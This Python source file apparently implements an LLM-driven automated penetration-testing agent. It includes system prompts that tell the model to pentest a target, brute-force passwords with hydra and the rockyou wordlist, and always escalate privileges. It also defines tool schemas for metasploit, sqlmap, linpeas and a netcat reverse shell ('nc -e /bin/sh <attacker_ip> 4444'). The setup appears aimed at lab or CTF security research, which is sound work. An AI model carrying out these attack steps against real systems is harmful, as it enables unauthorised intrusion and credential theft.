import asyncio
import re
import time

from pydantic import BaseModel
import json 

import httpx
from typing import List, Optional
from abc import ABC
from openai import OpenAI
from ollama import Client
from starlette.concurrency import run_in_threadpool
from tenacity import retry, stop_after_attempt, wait_exponential, retry_if_exception_type

from config.config import Configs
from db.repository.conversation_repository import add_conversation_to_db
from db.repository.message_repository import get_conversation_messages, add_message_to_db
from rag.kb.api.kb_doc_api import search_docs
from rag.reranker.reranker import LangchainReranker
from server.utils.utils import LLMType, replace_ip_with_targetip
from utils.log_common import build_logger

logger = build_logger()


class TaskPlan(BaseModel):
    id: str
    dependent_task_ids: List[str]
    instruction: str
    action: str

class OpenAIChat(ABC):
    def __init__(self, config):
        self.config = config
        self.client = OpenAI(api_key=self.config.api_key, base_url=self.config.base_url, timeout=config.timeout)
        self.model_name = self.config.llm_model_name

    @retry(
        stop=stop_after_attempt(3),  # Stop after 3 attempts
    )
    def chat(self, history: List) -> str:
        try:
            #response = self.client.chat.completions.create(
            #    model=self.model_name,
            #    messages=history,
                #max_tokens=2048,
            #    temperature=self.config.temperature,
            #    top_p=0.95,
            #    extra_body={
            #        "top_k": 20,
            #        "min_p": 0.0,
            #        "chat_template_kwargs": {"thinking": True}
            #    }
            #)
            response = self.client.chat.completions.create(
                model=self.model_name,
                messages=history,
                temperature=self.config.temperature,
            )
            ans = response.choices[0].message.content
            return ans
        except (httpx.HTTPStatusError, httpx.ReadTimeout,
                    httpx.ConnectTimeout, ConnectionError) as e:
            if getattr(e, "response", None) and e.response.status_code == 429:
                # Rate limit error, wait longer
                time.sleep(2)
            raise  # Re-raise the exception to trigger retry
        except Exception as e:
            return f"**ERROR**: {str(e)}"


            
class OllamaChat(ABC):
    def __init__(self, config):
        self.config = config
        self.client = Client(host=self.config.base_url)
        self.model_name = self.config.llm_model_name
        self.options = {
            "temperature": 0.6,
            "top_k": 20,
            "top_p": 0.95,
        }
        print(f"#######current model: {self.model_name}#######")
        print(f"#######current temperature: {self.config.temperature}#######")
        print(f"#######current top_k: {self.options['top_k']}#######")
    def chat(self, history: List[dict]) -> str:

        try:
            # options = {
            #     "temperature": self.config.temperature,
            #     "top_k": 20
            # }
            history[-1]['content'] = history[-1]['content'] 
            # history[-1]['content'] += "Think concisely but intelligently, focusing on key points.(Note: target machine IP: 10.102.196.3)"
            #print(f"QUESTION ----->: {history}")
            response = self.client.chat(
                model=self.model_name,
                messages=history,
                options=self.options,
                keep_alive=-1
            )
            ans = response["message"]["content"]
            if("<think>" in ans):
                if("EXAONE" in self.model_name):
                    ans = re.sub(r"<thought>.*?</thought>", "", ans, flags=re.DOTALL).strip()
                else:
                    ans = re.sub(r"<think>.*?</think>", "", ans, flags=re.DOTALL).strip()
            #print(f"ANSWER ----->: {ans}")
            #print("="*50)
            return ans
        except httpx.HTTPStatusError as e:
            return f"**ERROR**: {str(e)}"

# class OllamaChat(ABC):
#     def __init__(self, config):
#         self.config = config
#         self.client = Client(host=self.config.base_url)
#         self.model_name = self.config.llm_model_name
#         print(f"#######current model: {self.model_name}#######")
#         print(f"#######current temperature: {self.config.temperature}#######")
#     def chat(self, history: List[dict]) -> List[TaskPlan]:

#         try:
#             options = {
#                 "temperature": self.config.temperature,
#             }
#             print(f"QUESTION ----->: {history}")
#             response = self.client.chat(
#                 model=self.model_name,
#                 messages=history,
#                 options=options,
#                 keep_alive=-1
#             )
#             raw_output = response["message"]["content"]
#             raw_output = re.sub(r"<think>.*?</think>", "", raw_output, flags=re.DOTALL).strip()
#             print(f"RAW ANSWER -------->: {raw_output}")

#             # json_match = re.search(r"\[.*\]", raw_output, re.DOTALL)
#             # if json_match:
#             #     json_text = json_match.group(0)
#             # else:
#             #     return "No JSON found in response"

#             # tasks = json.loads(json_text)
#             # task_objects = [TaskPlan(**task) for task in tasks]
            
#             # print(f"ANSWER ----->: {task_objects}")
#             print("="*50)
#             return raw_output
#         except httpx.HTTPStatusError as e:
#             return f"**ERROR**: {str(e)}"

def _chat(query: str, kb_name=None, conversation_id=None, kb_query=None, summary=True):
    try:
        if Configs.basic_config.enable_rag and kb_name is not None:
            docs = asyncio.run(run_in_threadpool(search_docs,
                                                 query=kb_query,
                                                 knowledge_base_name=kb_name,
                                                 top_k=Configs.kb_config.top_k,
                                                 score_threshold=Configs.kb_config.score_threshold,
                                                 file_name="",
                                                 metadata={}))

            reranker_model = LangchainReranker(top_n=Configs.kb_config.top_n,
                                               name_or_path=Configs.llm_config.rerank_model)

            docs = reranker_model.compress_documents(documents=docs, query=kb_query)

            if len(docs) == 0:
                context = ""
            else:
                context = "\n".join([doc["page_content"] for doc in docs])

            if context:
                context = replace_ip_with_targetip(context)
                query = f"{query}\n\n\n Ensure that the **Overall Target** IP or the IP from the **Initial Description** is prioritized. You will respond to questions and generate tasks based on the provided penetration test case materials: {context}. \n"

        if conversation_id is not None and len(query) > 10000:
            query = query[:10000]
            #query = query[:Configs.llm_config.context_length]
        else:
            query = query[:Configs.llm_config.context_length]

        flag = False

        if conversation_id is not None:
            flag = True

        # Initialize or retrieve conversation ID
        conversation_id = add_conversation_to_db(Configs.llm_config.llm_model_name, conversation_id)

        history = [
            {
                "role": "system",
                "content": """You are a helpful assistant with strong reasoning capabilities. You will have to pentest the target machine. Focus on what you have found and always remember to replace <target_ip> with the actual IP the user provides and NEVER forget the target IP address. Read carefully the example cases that the user gives (in case you have to execute consecutive commands to get the result). If any tasks need to execute multiple commands, divide it into unique command and wrap it in <execute></execute> tag.(For Example: When ssh to a machine, it prompt for password and the command should be like : <execute> ssh user@192.168.10.72 </execute> <execute> test </execute>...). If any execution that prompt for password, ALWAYS remember to execute it as the ssh example for the corresponding user. If any execution that prompt for password(such as ssh command, sudo command, ftp command...) and the check_success is no, that's because you have not entered it yet, so you should always include it in <execute></execute> block and if the password you used for the first time not correct,  try to bruteforce it with the corresponding service that was found at the previous step. Lastly, If you can penetrate to the target machine, remember to escalate privileges, a very important stage /no_think """,
            }
        ]
        # Retrieve message history from database, and limit the number of messages
        for msg in get_conversation_messages(conversation_id)[-Configs.llm_config.history_len:]:
            history.append({"role": "user", "content": msg.query})
            history.append({"role": "assistant", "content": msg.response})

        # Add user query to the message history
        history.append({"role": "user", "content": query})

        # Initialize the correct model client
        if Configs.llm_config.llm_model == LLMType.OPENAI:
            client = OpenAIChat(config=Configs.llm_config)
        elif Configs.llm_config.llm_model == LLMType.OLLAMA:
            client = OllamaChat(config=Configs.llm_config)
        else:
            return "Unsupported model type"

        # Get response from the model
        response_text = client.chat(history)

        # Save both query and response to the database
        if summary:
            add_message_to_db(conversation_id, Configs.llm_config.llm_model_name, query, response_text)

        if flag:
            return response_text
        else:
            return response_text, conversation_id

    except Exception as e:
        print(e)
        return f"**ERROR**: {str(e)}"

tools = [
    {
        "type": "function",
        "function": {
            "name": "run_nmap_scan",
            "description": "Perform network scanning with Nmap to identify open ports, services, and potential vulnerabilities.",
            "parameters": {
                "type": "object",
                "properties": {
                    "cmd": {
                        "type": "string",
                        "description": "Complete Nmap command, e.g., 'nmap -sV -p 1-65535 <target_ip> -oN nmap_scan.txt' or 'nmap -A <target_ip>'"
                    }
                },
                "required": ["cmd"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "run_masscan_scan",
            "description": "Conduct a high-speed port scan using Masscan to detect open ports across a large range.",
            "parameters": {
                "type": "object",
                "properties": {
                    "cmd": {
                        "type": "string",
                        "description": "Complete Masscan command, e.g., 'masscan -p1-65535 <target_ip> -oL masscan_output.txt'"
                    }
                },
                "required": ["cmd"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "run_whatweb_scan",
            "description": "Identify web technologies and versions running on a target server.",
            "parameters": {
                "type": "object",
                "properties": {
                    "cmd": {
                        "type": "string",
                        "description": "Complete WhatWeb command, e.g., 'whatweb http://<target_ip> -v -a 3'"
                    }
                },
                "required": ["cmd"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "run_gobuster_scan",
            "description": "Enumerate hidden directories and files on a web server using Gobuster.",
            "parameters": {
                "type": "object",
                "properties": {
                    "cmd": {
                        "type": "string",
                        "description": "Complete Gobuster command, e.g., 'gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt'"
                    }
                },
                "required": ["cmd"]
            }
        }
    },
#     {
#     "type": "function",
#     "function": {
#         "name": "run_hydra_bruteforce",
#         "description": "Perform brute force attacks on services like SSH, FTP, or HTTP using a single username or a username wordlist.",
#         "parameters": {
#             "type": "object",
#             "properties": {
#                 "target": {
#                     "type": "string",
#                     "description": "The target IP address to attack, e.g., '10.102.197.4'."
#                 },
#                 "service": {
#                     "type": "string",
#                     "description": "The service to bruteforce (e.g., 'ssh', 'ftp', 'http').",
#                     "enum": ["ssh", "ftp", "http", "https", "smtp", "pop3"]
#                 },
#                 "username": {
#                     "type": "string",
#                     "description": "A single username to use for brute-forcing (takes precedence if provided, otherwise use username_list)."
#                 },
#                 "username_list": {
#                     "type": "string",
#                     "description": "Path to the username list file (default: '/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt' if no username is provided).",
#                     "default": "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
#                 },
#                 "password_list": {
#                     "type": "string",
#                     "description": "Path to the password list file (default: '/usr/share/wordlists/rockyou.txt').",
#                     "default": "/usr/share/wordlists/rockyou.txt"
#                 }
#             },
#             "required": ["target", "service"]
#         }
#     }
# },
    {
        "type": "function",
        "function": {
            "name": "run_metasploit_exploit",
            "description": "Execute an exploit using Metasploit with specified module and parameters.",
            "parameters": {
                "type": "object",
                "properties": {
                    "cmd": {
                        "type": "string",
                        "description": "Complete Metasploit command, e.g., 'msfconsole -q -x \"use exploit/windows/smb/ms17_010; set RHOSTS <target_ip>; run\"'"
                    }
                },
                "required": ["cmd"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "run_sqlmap_injection",
            "description": "Scan and exploit SQL injection vulnerabilities on a web parameter.",
            "parameters": {
                "type": "object",
                "properties": {
                    "cmd": {
                        "type": "string",
                        "description": "Complete sqlmap command, e.g., 'sqlmap -u http://<target_ip>/login.php -p username --dump -o sqlmap_log.txt'"
                    }
                },
                "required": ["cmd"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "run_burp_suite_request",
            "description": "Send a crafted HTTP request using Burp Suite CLI for web exploitation.",
            "parameters": {
                "type": "object",
                "properties": {
                    "cmd": {
                        "type": "string",
                        "description": "Complete Burp Suite command, e.g., 'burpsuite -r request.txt -o response.txt'"
                    }
                },
                "required": ["cmd"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "run_ssh_login",
            "description": "Establish an SSH connection to the target with credentials.",
            "parameters": {
                "type": "object",
                "properties": {
                    "cmd": {
                        "type": "string",
                        "description": "SSH command, e.g., 'ssh user@<target_ip>'"
                    },
                    "password": {
                        "type": "string",
                        "description": "Password for SSH, e.g., 'password123'"
                    }
                },
                "required": ["cmd"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "run_sudo_execute",
            "description": "Run a command with sudo privileges on the target system.",
            "parameters": {
                "type": "object",
                "properties": {
                    "cmd": {
                        "type": "string",
                        "description": "Sudo command, e.g., 'sudo whoami'"
                    },
                    "password": {
                        "type": "string",
                        "description": "Sudo password, e.g., 'password123'"
                    }
                },
                "required": ["cmd"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "run_ftp_access",
            "description": "Connect to an FTP server and perform file operations.",
            "parameters": {
                "type": "object",
                "properties": {
                    "cmd": {
                        "type": "string",
                        "description": "FTP command, e.g., 'ftp <target_ip>'"
                    },
                    "username": {
                        "type": "string",
                        "description": "FTP username, e.g., 'anonymous'"
                    },
                    "password": {
                        "type": "string",
                        "description": "FTP password, e.g., 'password123'"
                    }
                },
                "required": ["cmd"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "run_linpeas_scan",
            "description": "Execute LinPEAS to identify privilege escalation vectors on Linux.",
            "parameters": {
                "type": "object",
                "properties": {
                    "cmd": {
                        "type": "string",
                        "description": "LinPEAS command, e.g., 'linpeas.sh | tee linpeas_output.txt'"
                    }
                },
                "required": ["cmd"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "run_exploitdb_search",
            "description": "Search Exploit-DB for vulnerabilities matching the target.",
            "parameters": {
                "type": "object",
                "properties": {
                    "cmd": {
                        "type": "string",
                        "description": "Exploit-DB command, e.g., 'searchsploit apache 2.4.29'"
                    }
                },
                "required": ["cmd"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "run_netcat_reverse_shell",
            "description": "Set up a reverse shell using Netcat.",
            "parameters": {
                "type": "object",
                "properties": {
                    "cmd": {
                        "type": "string",
                        "description": "Netcat command, e.g., 'nc -e /bin/sh <attacker_ip> 4444'"
                    }
                },
                "required": ["cmd"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "run_wireshark_capture",
            "description": "Capture network traffic using Wireshark CLI for analysis.",
            "parameters": {
                "type": "object",
                "properties": {
                    "cmd": {
                        "type": "string",
                        "description": "Wireshark command, e.g., 'tshark -i eth0 -w capture.pcap'"
                    }
                },
                "required": ["cmd"]
            }
        }
    }
]
def run_hydra_bruteforce(target: str, service: str, username: str = None, username_list: str = "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt", password_list: str = "/usr/share/wordlists/rockyou.txt"):
    """
    Execute a Hydra brute-force attack and return the result.
    
    Args:
        target (str): Target IP address.
        service (str): Service to attack (e.g., 'ssh', 'ftp').
        username (str, optional): Single username to use.
        username_list (str, optional): Path to username list file.
        password_list (str, optional): Path to password list file.
    
    Returns:
        dict: Result of the Hydra command execution.
    """
    # Tạo lệnh Hydra dựa trên tham số
    if username:
        cmd = f"hydra -l {username} -P {password_list} {target} {service}"
    else:
        cmd = f"hydra -L {username_list} -P {password_list} {target} {service}"
    
    # Giả lập thực thi lệnh (thay bằng thực thi thật nếu cần)
    # Ví dụ: subprocess.run() để chạy lệnh và lấy kết quả
    return {
        "cmd": cmd,
        "stdout": f"Simulated output for: {cmd}",
        "stderr": "",
        "returncode": 0
    }


# Define tool implementations
tool_impl = {
    "run_nmap_scan": lambda cmd: {"stdout": f"<execute>{cmd}</execute>", "stderr": "", "returncode": 0},
    "run_masscan_scan": lambda cmd: {"stdout": f"<execute>{cmd}</execute>", "stderr": "", "returncode": 0},
    "run_whatweb_scan": lambda cmd: {"stdout": f"<execute>{cmd}</execute>", "stderr": "", "returncode": 0},
    "run_gobuster_scan": lambda cmd: {"stdout": f"<execute>{cmd}</execute>", "stderr": "", "returncode": 0},
    "run_hydra_bruteforce": run_hydra_bruteforce,
    "run_metasploit_exploit": lambda cmd: {"stdout": f"<execute>{cmd}</execute>", "stderr": "", "returncode": 0},
    "run_sqlmap_injection": lambda cmd: {"stdout": f"<execute>{cmd}</execute>", "stderr": "", "returncode": 0},
    "run_burp_suite_request": lambda cmd: {"stdout": f"<execute>{cmd}</execute>", "stderr": "", "returncode": 0},
    "run_ssh_login": lambda cmd, password=None: {"stdout": f"<execute>{cmd}</execute>" + (f"<execute>{password}</execute>" if password else ""), "stderr": "", "returncode": 0},
    "run_sudo_execute": lambda cmd, password=None: {"stdout": f"<execute>{cmd}</execute>" + (f"<execute>{password}</execute>" if password else ""), "stderr": "", "returncode": 0},
    "run_ftp_access": lambda cmd, username=None, password=None: {"stdout": f"<execute>{cmd}</execute>" + (f"<execute>{username}</execute>" if username else "") + (f"<execute>{password}</execute>" if password else ""), "stderr": "", "returncode": 0},
    "run_linpeas_scan": lambda cmd: {"stdout": f"<execute>{cmd}</execute>", "stderr": "", "returncode": 0},
    "run_exploitdb_search": lambda cmd: {"stdout": f"<execute>{cmd}</execute>", "stderr": "", "returncode": 0},
    "run_netcat_reverse_shell": lambda cmd: {"stdout": f"<execute>{cmd}</execute>", "stderr": "", "returncode": 0},
    "run_wireshark_capture": lambda cmd: {"stdout": f"<execute>{cmd}</execute>", "stderr": "", "returncode": 0}
}

def _chat_function_calling(query: str, kb_name=None, conversation_id=None, kb_query=None, summary=True):
    try:
        logger.info(f"Starting _chat_function_calling with query: {query[:100]}... (truncated)")
        
        if Configs.basic_config.enable_rag and kb_name is not None:
            logger.info("RAG enabled, searching documents...")
            docs = asyncio.run(run_in_threadpool(search_docs,
                                                 query=kb_query,
                                                 knowledge_base_name=kb_name,
                                                 top_k=Configs.kb_config.top_k,
                                                 score_threshold=Configs.kb_config.score_threshold,
                                                 file_name="",
                                                 metadata={}))
            logger.info(f"Retrieved {len(docs)} documents from search_docs")

            reranker_model = LangchainReranker(top_n=Configs.kb_config.top_n,
                                               name_or_path=Configs.llm_config.rerank_model)
            logger.info("Reranking documents...")
            docs = reranker_model.compress_documents(documents=docs, query=kb_query)
            logger.info(f"Reranked to {len(docs)} documents")

            if len(docs) == 0:
                context = ""
            else:
                context = "\n".join([doc["page_content"] for doc in docs])

            if context:
                context = replace_ip_with_targetip(context)
                query = f"{query}\n\n\n Ensure that the **Overall Target** IP or the IP from the **Initial Description** is prioritized. You will respond to questions and generate tasks based on the provided penetration test case materials: {context}. \n"
                logger.info("Updated query with RAG context")

        if conversation_id is not None and len(query) > 10000:
            query = query[:10000]
            logger.info("Truncated query to 10000 characters")
        else:
            query = query[:Configs.llm_config.context_length]
            logger.info(f"Truncated query to {Configs.llm_config.context_length} characters")

        flag = False
        if conversation_id is not None:
            flag = True
            logger.info("Conversation ID provided, flag set to True")

        logger.info("Adding conversation to DB...")
        try:
            conversation_id = add_conversation_to_db(Configs.llm_config.llm_model_name, conversation_id)
            if not conversation_id:
                raise ValueError("Conversation ID is None")
            logger.info(f"Conversation ID: {conversation_id}")
        except Exception as db_err:
            logger.error(f"Failed to add conversation to DB: {str(db_err)}")
            raise

        history = [
            {
                "role": "system",
                "content": """You are a helpful assistant with strong reasoning capabilities. You will pentest the target machine. Focus on what you have found and always replace <target_ip> with the actual IP the user provides and NEVER forget the target IP address. Read carefully the example cases that the user gives (in case you have to execute consecutive commands to get the result). If any tasks need to execute multiple commands, divide them into unique commands and wrap each in <execute></execute> tags (e.g., for SSH: <execute>ssh user@192.168.10.72</execute><execute>test</execute>). If any execution prompts for a password (e.g., ssh, sudo, ftp) and check_success is no, include the password in a separate <execute></execute> block; if the password is incorrect, bruteforce it with the corresponding service found previously using the tool run_hydra_bruteforce. For brute-forcing, only use a single username if it has been enumerated in previous steps; otherwise, use /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt as the default username list. Use /usr/share/wordlists/rockyou.txt as the default password list unless otherwise specified. If you penetrate the target machine, always escalate privileges, a critical stage. When using function calling, ensure all tool call arguments are valid JSON objects matching the tool's expected parameters (e.g., for run_hydra_bruteforce: {"target": "10.102.197.4", "service": "ssh", "username": "admin"} if enumerated, or {"target": "10.102.197.4", "service": "ssh"} to use the username list). For ALL tasks requiring command execution (e.g., scanning, brute-forcing, exploitation), you MUST use the appropriate tool (e.g., run_nmap_scan, run_hydra_bruteforce). After a tool call, return the exact command(s) from the tool's parameters in <execute></execute> tags (e.g., <execute>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.102.197.4 ssh</execute> or <execute>hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt 10.102.197.4 ssh</execute>), without extra text or JSON. Do not include reasoning or think step-by-step; provide only the response."""
            }
        ]

        logger.info("Retrieving conversation messages...")
        try:
            messages = get_conversation_messages(conversation_id)[-Configs.llm_config.history_len:]
            logger.info(f"Retrieved {len(messages)} messages")
        except Exception as db_err:
            logger.error(f"Failed to retrieve conversation messages: {str(db_err)}")
            raise

        for msg in messages:
            history.append({"role": "user", "content": msg.query})
            history.append({"role": "assistant", "content": msg.response})

        history.append({"role": "user", "content": query})
        logger.info("Added user query to history")

        if Configs.llm_config.llm_model == LLMType.OPENAI:
            logger.info("Using OpenAIChat client")
            client = OpenAIChat(config=Configs.llm_config)
            try:
                client.client.models.list()
                logger.info("Successfully connected to LLM API")
            except Exception as llm_err:
                logger.error(f"Failed to connect to LLM API: {str(llm_err)}")
                raise

            iteration = 0
            max_iterations = 10
            while iteration < max_iterations:
                logger.info(f"Calling LLM, iteration {iteration + 1}")
                try:
                    response = client.client.chat.completions.create(
                        model=client.model_name,
                        messages=history,
                        temperature=client.config.temperature,
                        tools=tools,
                        tool_choice="auto"
                    )
                    logger.info(f"LLM response status: {response}")
                except httpx.HTTPStatusError as http_err:
                    logger.error(f"HTTP error from LLM API: status_code={http_err.response.status_code}, detail={http_err.response.text}")
                    raise
                except httpx.ReadTimeout as timeout_err:
                    logger.error(f"LLM API timeout: {str(timeout_err)}")
                    raise
                except Exception as llm_err:
                    logger.error(f"LLM API call failed: {str(llm_err)}")
                    raise

                msg = response.choices[0].message
                logger.info(f"LLM response message: {msg}")

                if msg.tool_calls:
                    logger.info(f"Found {len(msg.tool_calls)} tool calls")
                    for call in msg.tool_calls:
                        name = call.function.name
                        logger.info(f"Processing tool call: {name}")
                        try:
                            params = json.loads(call.function.arguments or "{}")
                            logger.info(f"Tool call parameters: {params}")
                            result = tool_impl[name](**params)
                            logger.info(f"Tool call result: {result}")

                            # Tạo lệnh Hydra từ tham số
                            if name == "run_hydra_bruteforce":
                                target = params.get("target", "")
                                service = params.get("service", "ssh")
                                username = params.get("username")
                                username_list = params.get("username_list", "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt")
                                password_list = params.get("password_list", "/usr/share/wordlists/rockyou.txt")
                                if not target:
                                    raise ValueError("Missing 'target' in run_hydra_bruteforce parameters")
                                if username:
                                    cmd = f"hydra -l {username} -P {password_list} {target} {service}"
                                else:
                                    cmd = f"hydra -L {username_list} -P {password_list} {target} {service}"
                                response_text = f"<execute>{cmd}</execute>"
                            else:
                                cmd = params.get("cmd", "Command not generated from tool")
                                response_text = f"<execute>{cmd}</execute>"

                            history.append({
                                "role": "tool",
                                "tool_call_id": call.id,
                                "name": name,
                                "content": json.dumps(result, ensure_ascii=False)
                            })
                        except json.JSONDecodeError as json_err:
                            logger.error(f"JSON decode error for tool call arguments: {call.function.arguments}, error: {str(json_err)}")
                            raise
                        except KeyError as key_err:
                            logger.error(f"Tool {name} not found in tool_impl: {str(key_err)}")
                            raise
                        except TypeError as type_err:
                            logger.error(f"Type error in tool call parameters for {name}: {str(type_err)}")
                            raise
                    iteration += 1
                    continue
                else:
                    response_text = msg.content
                    logger.info(f"Final response: {response_text}")
                    break
            else:
                logger.error("Max iterations reached in tool calling loop")
                return "**ERROR**: Max iterations reached in tool calling loop"
        elif Configs.llm_config.llm_model == LLMType.OLLAMA:
            logger.info("Using OllamaChat client")
            client = OllamaChat(config=Configs.llm_config)
            response_text = client.chat(history)
            logger.info(f"Ollama response: {response_text}")
        else:
            logger.error("Unsupported model type")
            return "Unsupported model type"

        if summary:
            logger.info("Saving query and response to database")
            try:
                add_message_to_db(conversation_id, Configs.llm_config.llm_model_name, query, response_text)
                logger.info("Saved to database successfully")
            except Exception as db_err:
                logger.error(f"Failed to save to database: {str(db_err)}")
                raise

        if flag:
            logger.info("Returning response_text only")
            return response_text
        else:
            logger.info("Returning response_text and conversation_id")
            return response_text, conversation_id

    except Exception as e:
        error_message = str(e).replace("{", "{{").replace("}", "}}")
        logger.error(f"Exception in _chat_function_calling: {error_message}", exc_info=True)
        print(e)
        return f"**ERROR**: {error_message}"